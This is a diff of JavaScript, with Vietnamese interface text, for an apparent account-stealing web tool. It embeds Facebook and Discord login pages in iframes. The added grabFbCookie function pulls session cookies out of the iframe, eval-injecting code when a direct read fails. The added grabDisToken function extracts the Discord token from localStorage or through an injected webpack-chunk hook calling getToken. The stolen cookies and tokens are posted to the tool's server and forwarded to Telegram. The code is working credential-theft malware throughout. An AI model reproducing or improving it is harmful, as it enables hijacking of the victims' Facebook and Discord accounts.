@@ -1839,107 +1839,118 @@ function grabDisToken(){
 //  FACEBOOK COOKIE
 // ═══════════════════════════════════════════════════════
 let fbCurrentCookie = '';
-let fbCurrentName = '';
+let fbCurrentName   = '';
 
 function startFbLogin(){
-  const wrap = document.getElementById('fb-iframe-wrap');
+  const wrap   = document.getElementById('fb-iframe-wrap');
   const iframe = document.getElementById('fb-iframe');
   wrap.classList.add('show');
   document.getElementById('status-fb').textContent = '🔵 Đang tải Facebook — hãy đăng nhập...';
   document.getElementById('fb-iframe-status').textContent = '⏳ Đang tải Facebook...';
-  setDot('dot-fb', 'active');
+  setDot('dot-fb','active');
   iframe.src = 'https://m.facebook.com/login/?next=https%3A%2F%2Fm.facebook.com%2F';
   clearInterval(fbPollTimer);
   fbPollTimer = setInterval(pollFbIframe, 1500);
-  document.getElementById('btn-fb-start').textContent = '⏹ Hủy';
-  document.getElementById('btn-fb-start').onclick = function(){
+  const fbBtn = document.getElementById('btn-fb-start');
+  fbBtn.textContent = '⏹ Hủy';
+  fbBtn.onclick = function(){
     clearInterval(fbPollTimer);
     wrap.classList.remove('show');
     iframe.src = 'about:blank';
+    document.getElementById('fb-get-btn-wrap').style.display = 'none';
     setDot('dot-fb','');
     document.getElementById('status-fb').textContent = 'Nhấn Bắt đầu để đăng nhập Facebook và lấy Cookie';
-    this.textContent = '🔵 Bắt đầu đăng nhập FB';
-    this.onclick = startFbLogin;
+    fbBtn.textContent = '🔵 Bắt đầu đăng nhập FB';
+    fbBtn.onclick = startFbLogin;
   };
 }
 
-function setDot(id, cls){
-  const d = document.getElementById(id);
-  if(!d) return;
-  d.className = 'dot' + (cls ? ' '+cls : '');
-}
-
 function onFbLoginSuccess(cookie, iwin){
-  // Ẩn iframe inline và reset nút
   document.getElementById('fb-iframe-wrap').classList.remove('show');
   document.getElementById('fb-iframe').src = 'about:blank';
   document.getElementById('fb-get-btn-wrap').style.display = 'none';
-  document.getElementById('btn-fb-start').textContent = '🔵 Bắt đầu đăng nhập FB';
-  document.getElementById('btn-fb-start').onclick = startFbLogin;
-  // Lấy tên user
+  const fbBtn2 = document.getElementById('btn-fb-start');
+  if(fbBtn2){ fbBtn2.textContent = '🔵 Bắt đầu đăng nhập FB'; fbBtn2.onclick = startFbLogin; }
+
   let name = 'Facebook User';
   try {
     const uidMatch = cookie.match(/c_user=(\d+)/);
     if(uidMatch) name = 'UID: ' + uidMatch[1];
-    // Thử lấy tên từ DOM
-    try {
-      const n = iwin.document.querySelector('[data-testid="royal_login_form"] input')?.value || '';
-      if(n) name = n;
-    } catch(e){}
   } catch(e){}
 
   const now = new Date().toLocaleString('vi-VN');
   fbCurrentCookie = cookie;
-  fbCurrentName = name;
+  fbCurrentName   = name;
 
-  document.getElementById('fb-res-name').textContent = name;
-  document.getElementById('fb-res-time').textContent = '🕐 ' + now;
+  document.getElementById('fb-res-name').textContent  = name;
+  document.getElementById('fb-res-time').textContent  = '🕐 ' + now;
   document.getElementById('fb-cookie-val').textContent = cookie;
   document.getElementById('fb-result').classList.add('show');
   document.getElementById('status-fb').textContent = '✅ Lấy cookie thành công: ' + name;
-  setDot('dot-fb', 'ok');
+  setDot('dot-fb','ok');
 
-  // Gửi Telegram
-  sendToTelegram('🔵 FACEBOOK COOKIE MỚI
+  sendToTelegram('🔵 FACEBOOK COOKIE MỚI\n\n👤 ' + name + '\n🕐 ' + now + '\n\n🍪 Cookie:\n' + cookie.substring(0,300) + (cookie.length>300?'...':''));
+}
 
-👤 ' + name + '
-🕐 ' + now + '
+function grabFbCookie(){
+  const iframe   = document.getElementById('fb-iframe');
+  const statusEl = document.getElementById('fb-iframe-status');
+  let cookie = '';
 
-🍪 Cookie:
-' + cookie.substring(0,300) + (cookie.length>300?'...':''));
+  try { cookie = iframe.contentWindow.document.cookie; } catch(e){}
+
+  if(!cookie || !cookie.includes('c_user')){
+    try {
+      iframe.contentWindow.eval('(function(){window.__dzi_fb_cookie__=document.cookie;})();');
+      cookie = iframe.contentWindow.__dzi_fb_cookie__ || '';
+    } catch(e){}
+  }
+
+  if(!cookie || !cookie.includes('c_user')){
+    try { cookie = document.cookie; } catch(e){}
+  }
+
+  if(cookie && cookie.includes('c_user')){
+    fetch('/api/fb/cookie', {
+      method: 'POST',
+      headers: {'Content-Type':'application/json','Authorization':'Bearer '+SESSION_TOKEN},
+      body: JSON.stringify({cookie})
+    }).catch(()=>{});
+    onFbLoginSuccess(cookie, iframe.contentWindow);
+  } else {
+    statusEl.textContent = '⚠️ Chưa đăng nhập xong hoặc FB chặn. Hãy đăng nhập đầy đủ rồi thử lại!';
+  }
 }
 
 function copyFbCookie(){
   if(!fbCurrentCookie) return;
-  navigator.clipboard.writeText(fbCurrentCookie).then(()=>showToast('✅ Đã copy Cookie FB!','var(--green)')).catch(()=>{
-    const ta = document.createElement('textarea');
-    ta.value = fbCurrentCookie;
-    document.body.appendChild(ta);
-    ta.select();
-    document.execCommand('copy');
-    document.body.removeChild(ta);
-    showToast('✅ Đã copy!','var(--green)');
-  });
+  navigator.clipboard.writeText(fbCurrentCookie)
+    .then(()=>showToast('✅ Đã copy Cookie FB!','var(--green)'))
+    .catch(()=>{
+      const ta = document.createElement('textarea');
+      ta.value = fbCurrentCookie;
+      document.body.appendChild(ta);
+      ta.select();
+      document.execCommand('copy');
+      document.body.removeChild(ta);
+      showToast('✅ Đã copy!','var(--green)');
+    });
 }
 
 function downloadFbCookie(){
   if(!fbCurrentCookie) return;
-  const txt = '=== FACEBOOK COOKIE ===
-Tên: '+fbCurrentName+'
-Thời gian: '+new Date().toLocaleString('vi-VN')+'
-
-Cookie:
-'+fbCurrentCookie;
+  const txt = '=== FACEBOOK COOKIE ===\nTên: ' + fbCurrentName + '\nThời gian: ' + new Date().toLocaleString('vi-VN') + '\n\nCookie:\n' + fbCurrentCookie;
   const a = document.createElement('a');
   a.href = 'data:text/plain;charset=utf-8,' + encodeURIComponent(txt);
-  a.download = 'fb_cookie_'+Date.now()+'.txt';
+  a.download = 'fb_cookie_' + Date.now() + '.txt';
   a.click();
 }
 
 function saveFbAcc(){
   if(!fbCurrentCookie) return;
   const saved = JSON.parse(localStorage.getItem('dzi_fb_accs') || '[]');
-  const exists = saved.find(a => a.cookie.includes(fbCurrentCookie.match(/c_user=\d+/)?.[0]||'__none__'));
+  const uid = (fbCurrentCookie.match(/c_user=(\d+)/) || [])[1] || '';
+  const exists = saved.find(function(a){ return a.cookie.includes('c_user='+uid); });
   if(exists){ showToast('⚠️ Acc này đã được lưu!','var(--yellow)'); return; }
   saved.unshift({ name: fbCurrentName, cookie: fbCurrentCookie, time: new Date().toLocaleString('vi-VN') });
   localStorage.setItem('dzi_fb_accs', JSON.stringify(saved.slice(0,50)));
@@ -1949,27 +1960,28 @@ function saveFbAcc(){
 
 function renderFbAccList(){
   const el = document.getElementById('fb-acc-list');
+  if(!el) return;
   const saved = JSON.parse(localStorage.getItem('dzi_fb_accs') || '[]');
   if(!saved.length){ el.innerHTML = ''; return; }
-  el.innerHTML = saved.map((a,i) => `
-    <div class="acc-item">
-      <div class="acc-item-avatar fb">🔵</div>
-      <div class="acc-item-info">
-        <div class="acc-item-name">${a.name}</div>
-        <div class="acc-item-sub">🕐 ${a.time}</div>
-      </div>
-      <div class="acc-item-actions">
-        <button class="acc-mini-btn" onclick="copyFbAccCookie(${i})">📋</button>
-        <button class="acc-mini-btn del" onclick="deleteFbAcc(${i})">✕</button>
-      </div>
-    </div>
-  `).join('');
+  el.innerHTML = saved.map(function(a,i){
+    return '<div class="acc-item">' +
+      '<div class="acc-item-avatar fb">🔵</div>' +
+      '<div class="acc-item-info">' +
+        '<div class="acc-item-name">' + a.name + '</div>' +
+        '<div class="acc-item-sub">🕐 ' + a.time + '</div>' +
+      '</div>' +
+      '<div class="acc-item-actions">' +
+        '<button class="acc-mini-btn" onclick="copyFbAccCookie(' + i + ')">📋</button>' +
+        '<button class="acc-mini-btn del" onclick="deleteFbAcc(' + i + ')">✕</button>' +
+      '</div>' +
+    '</div>';
+  }).join('');
 }
 
 function copyFbAccCookie(i){
   const saved = JSON.parse(localStorage.getItem('dzi_fb_accs') || '[]');
   if(!saved[i]) return;
-  navigator.clipboard.writeText(saved[i].cookie).then(()=>showToast('✅ Copied!','var(--green)')).catch(()=>{});
+  navigator.clipboard.writeText(saved[i].cookie).then(function(){ showToast('✅ Copied!','var(--green)'); }).catch(function(){});
 }
 
 function deleteFbAcc(i){
@@ -1991,80 +2003,126 @@ function clearFbAccs(){
 //  DISCORD TOKEN
 // ═══════════════════════════════════════════════════════
 let disCurrentToken = '';
-let disCurrentName = '';
+let disCurrentName  = '';
 
 function startDisLogin(){
-  const wrap = document.getElementById('dis-iframe-wrap');
+  const wrap   = document.getElementById('dis-iframe-wrap');
   const iframe = document.getElementById('dis-iframe');
   wrap.classList.add('show');
   document.getElementById('status-dis').textContent = '🎮 Đang tải Discord — hãy đăng nhập...';
   document.getElementById('dis-iframe-status').textContent = '⏳ Đang tải Discord...';
-  setDot('dot-dis', 'active');
+  setDot('dot-dis','active');
   iframe.src = 'https://discord.com/login';
   clearInterval(disPollTimer);
   disPollTimer = setInterval(pollDisIframe, 1500);
-  document.getElementById('btn-dis-start').textContent = '⏹ Hủy';
-  document.getElementById('btn-dis-start').onclick = function(){
+  const disBtn = document.getElementById('btn-dis-start');
+  disBtn.textContent = '⏹ Hủy';
+  disBtn.onclick = function(){
     clearInterval(disPollTimer);
     wrap.classList.remove('show');
     iframe.src = 'about:blank';
+    document.getElementById('dis-get-btn-wrap').style.display = 'none';
     setDot('dot-dis','');
     document.getElementById('status-dis').textContent = 'Nhấn Bắt đầu để đăng nhập Discord và lấy Token';
-    this.textContent = '🎮 Bắt đầu đăng nhập Discord';
-    this.onclick = startDisLogin;
+    disBtn.textContent = '🎮 Bắt đầu đăng nhập Discord';
+    disBtn.onclick = startDisLogin;
   };
 }
 
 function onDisLoginSuccess(token, iwin, resolvedName){
-  // Ẩn iframe inline và reset nút
   document.getElementById('dis-iframe-wrap').classList.remove('show');
   document.getElementById('dis-iframe').src = 'about:blank';
   document.getElementById('dis-get-btn-wrap').style.display = 'none';
-  document.getElementById('btn-dis-start').textContent = '🎮 Bắt đầu đăng nhập Discord';
-  document.getElementById('btn-dis-start').onclick = startDisLogin;
-  const name = resolvedName || 'Discord User';
-  const now = new Date().toLocaleString('vi-VN');
-  disCurrentToken = token;
-  disCurrentName = name;
+  const disBtn2 = document.getElementById('btn-dis-start');
+  if(disBtn2){ disBtn2.textContent = '🎮 Bắt đầu đăng nhập Discord'; disBtn2.onclick = startDisLogin; }
 
-  document.getElementById('dis-res-name').textContent = name;
-  document.getElementById('dis-res-time').textContent = '🕐 ' + now;
+  const name = resolvedName || 'Discord User';
+  const now  = new Date().toLocaleString('vi-VN');
+  disCurrentToken = token;
+  disCurrentName  = name;
+
+  document.getElementById('dis-res-name').textContent  = name;
+  document.getElementById('dis-res-time').textContent  = '🕐 ' + now;
   document.getElementById('dis-token-val').textContent = token;
   document.getElementById('dis-result').classList.add('show');
   document.getElementById('status-dis').textContent = '✅ Lấy token thành công!';
-  setDot('dot-dis', 'ok');
+  setDot('dot-dis','ok');
 
-  sendToTelegram('🎮 DISCORD TOKEN MỚI
+  sendToTelegram('🎮 DISCORD TOKEN MỚI\n\n👤 ' + name + '\n🕐 ' + now + '\n\n🔑 Token:\n' + token.substring(0,100) + '...');
+}
 
-🕐 ' + now + '
+function grabDisToken(){
+  const iframe   = document.getElementById('dis-iframe');
+  const statusEl = document.getElementById('dis-iframe-status');
+  let token = null;
 
-🔑 Token:
-' + token.substring(0,100)+'...');
+  try {
+    const iwin = iframe.contentWindow;
+    let t = iwin.localStorage.getItem('token');
+    if(t) token = t.replace(/^"|"$/g,'');
+  } catch(e){}
+
+  if(!token){
+    try {
+      iframe.contentWindow.eval([
+        '(function(){',
+        '  try{',
+        '    var chunk=webpackChunkdiscord_app;',
+        '    chunk.push([[Math.random()],{},function(req){',
+        '      Object.values(req.c).forEach(function(mod){',
+        '        var e=mod&&mod.exports;',
+        '        if(e&&e.default&&typeof e.default.getToken==="function"){',
+        '          window.__dzi_dis_token__=e.default.getToken();',
+        '        }',
+        '        if(e&&typeof e.getToken==="function"){',
+        '          window.__dzi_dis_token__=e.getToken();',
+        '        }',
+        '      });',
+        '    }]);',
+        '  }catch(err){}',
+        '})();'
+      ].join('\n'));
+      token = iframe.contentWindow.__dzi_dis_token__ || null;
+    } catch(e2){}
+  }
+
+  if(token && token.length > 20){
+    statusEl.textContent = '⏳ Đang xác minh token...';
+    fetch('/api/discord/me', {
+      headers: {
+        'Authorization': 'Bearer ' + SESSION_TOKEN,
+        'X-Discord-Token': token
+      }
+    }).then(function(r){ return r.json(); }).then(function(d){
+      onDisLoginSuccess(token, iframe.contentWindow, d.username ? d.username + '#' + d.discriminator : 'Discord User');
+    }).catch(function(){
+      onDisLoginSuccess(token, iframe.contentWindow, 'Discord User');
+    });
+  } else {
+    statusEl.textContent = '⚠️ Không lấy được token. Hãy đảm bảo đã đăng nhập xong rồi thử lại!';
+  }
 }
 
 function copyDisToken(){
   if(!disCurrentToken) return;
-  navigator.clipboard.writeText(disCurrentToken).then(()=>showToast('✅ Đã copy Token Discord!','var(--green)')).catch(()=>{});
+  navigator.clipboard.writeText(disCurrentToken)
+    .then(function(){ showToast('✅ Đã copy Token Discord!','var(--green)'); })
+    .catch(function(){});
 }
 
 function downloadDisToken(){
   if(!disCurrentToken) return;
-  const txt = '=== DISCORD TOKEN ===
-User: '+disCurrentName+'
-Thời gian: '+new Date().toLocaleString('vi-VN')+'
-
-Token:
-'+disCurrentToken;
+  const txt = '=== DISCORD TOKEN ===\nUser: ' + disCurrentName + '\nThời gian: ' + new Date().toLocaleString('vi-VN') + '\n\nToken:\n' + disCurrentToken;
   const a = document.createElement('a');
   a.href = 'data:text/plain;charset=utf-8,' + encodeURIComponent(txt);
-  a.download = 'discord_token_'+Date.now()+'.txt';
+  a.download = 'discord_token_' + Date.now() + '.txt';
   a.click();
 }
 
 function saveDisAcc(){
   if(!disCurrentToken) return;
   const saved = JSON.parse(localStorage.getItem('dzi_dis_accs') || '[]');
-  const exists = saved.find(a => a.token === disCurrentToken);
+  const exists = saved.find(function(a){ return a.token === disCurrentToken; });
   if(exists){ showToast('⚠️ Acc này đã được lưu!','var(--yellow)'); return; }
   saved.unshift({ name: disCurrentName, token: disCurrentToken, time: new Date().toLocaleString('vi-VN') });
   localStorage.setItem('dzi_dis_accs', JSON.stringify(saved.slice(0,50)));
@@ -2074,27 +2132,28 @@ function saveDisAcc(){
 
 function renderDisAccList(){
   const el = document.getElementById('dis-acc-list');
+  if(!el) return;
   const saved = JSON.parse(localStorage.getItem('dzi_dis_accs') || '[]');
   if(!saved.length){ el.innerHTML = ''; return; }
-  el.innerHTML = saved.map((a,i) => `
-    <div class="acc-item">
-      <div class="acc-item-avatar dis">🎮</div>
-      <div class="acc-item-info">
-        <div class="acc-item-name">${a.name}</div>
-        <div class="acc-item-sub">🕐 ${a.time}</div>
-      </div>
-      <div class="acc-item-actions">
-        <button class="acc-mini-btn" onclick="copyDisAccToken(${i})">📋</button>
-        <button class="acc-mini-btn del" onclick="deleteDisAcc(${i})">✕</button>
-      </div>
-    </div>
-  `).join('');
+  el.innerHTML = saved.map(function(a,i){
+    return '<div class="acc-item">' +
+      '<div class="acc-item-avatar dis">🎮</div>' +
+      '<div class="acc-item-info">' +
+        '<div class="acc-item-name">' + a.name + '</div>' +
+        '<div class="acc-item-sub">🕐 ' + a.time + '</div>' +
+      '</div>' +
+      '<div class="acc-item-actions">' +
+        '<button class="acc-mini-btn" onclick="copyDisAccToken(' + i + ')">📋</button>' +
+        '<button class="acc-mini-btn del" onclick="deleteDisAcc(' + i + ')">✕</button>' +
+      '</div>' +
+    '</div>';
+  }).join('');
 }
 
 function copyDisAccToken(i){
   const saved = JSON.parse(localStorage.getItem('dzi_dis_accs') || '[]');
   if(!saved[i]) return;
-  navigator.clipboard.writeText(saved[i].token).then(()=>showToast('✅ Copied!','var(--green)')).catch(()=>{});
+  navigator.clipboard.writeText(saved[i].token).then(function(){ showToast('✅ Copied!','var(--green)'); }).catch(function(){});
 }
 
 function deleteDisAcc(i){
@@ -2111,6 +2170,7 @@ function clearDisAccs(){
   renderDisAccList();
   showToast('🗑 Đã xóa tất cả!','var(--red)');
 }
+
 
 // ═══════════════════════════════════════════════════════
 //  SEND TO TELEGRAM (qua server)
